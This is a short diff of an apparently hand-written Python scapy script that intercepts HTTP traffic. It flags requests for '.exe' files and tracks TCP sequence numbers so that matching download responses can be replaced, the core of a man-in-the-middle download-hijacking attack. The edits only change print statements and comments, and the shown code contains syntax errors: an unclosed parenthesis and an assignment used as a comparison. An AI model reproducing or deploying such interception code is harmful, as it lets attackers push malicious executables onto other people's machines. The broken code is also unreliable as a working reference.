@@ -29,7 +29,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("\nHTTP Request outbound found:\n")
-            print(scapy_packet.show())
+            #print(scapy_packet.show())
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("\n****EXE FOUND****\n")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
@@ -96,7 +96,7 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("EXE found")
                 ack_list.append(scapy_packet[scapy.TCP].ack #append TCP ACK field to list
-                print(scapy_packet.show())
+                print(scapy_packet.show()) #show whats in the packet to determine what you want to modify
         elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                 print("++Replacing file")
